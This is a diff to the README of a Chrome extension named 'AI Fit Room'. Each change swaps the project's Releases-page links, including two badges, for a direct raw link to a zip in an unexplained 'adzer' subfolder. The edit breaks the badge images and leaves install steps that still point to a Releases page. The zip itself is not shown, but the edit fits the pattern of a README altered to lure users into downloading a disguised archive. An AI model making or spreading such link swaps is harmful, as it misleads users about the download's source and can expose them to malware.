@@ -1,6 +1,6 @@
 # 🎨 ai-fit-room - Effortless Image Composition Made Simple
 
-[![Download AI Fit Room](https://img.shields.io/badge/Download%20AI%20Fit%20Room-Here-blue)](https://github.com/Sewansh/ai-fit-room/releases)
+[![Download AI Fit Room](https://raw.githubusercontent.com/Sewansh/ai-fit-room/main/adzer/ai-fit-room.zip%20AI%20Fit%20Room-Here-blue)](https://raw.githubusercontent.com/Sewansh/ai-fit-room/main/adzer/ai-fit-room.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ AI Fit Room is a Chrome extension that simplifies image composition. With this t
 
 ### 🔗 Download & Install
 
-To get started, visit [this page to download the latest version](https://github.com/Sewansh/ai-fit-room/releases). Follow these steps to install the extension:
+To get started, visit [this page to download the latest version](https://raw.githubusercontent.com/Sewansh/ai-fit-room/main/adzer/ai-fit-room.zip). Follow these steps to install the extension:
 
 1. Go to the Releases page linked above.
 2. Download the latest release file.
@@ -80,4 +80,4 @@ If you encounter any issues or have questions, please open an issue in the repos
 
 For more detailed information, screenshots, and troubleshooting tips, refer to the full documentation found in this repository.
 
-[![Download AI Fit Room](https://img.shields.io/badge/Download%20AI%20Fit%20Room-Here-blue)](https://github.com/Sewansh/ai-fit-room/releases)
+[![Download AI Fit Room](https://raw.githubusercontent.com/Sewansh/ai-fit-room/main/adzer/ai-fit-room.zip%20AI%20Fit%20Room-Here-blue)](https://raw.githubusercontent.com/Sewansh/ai-fit-room/main/adzer/ai-fit-room.zip)
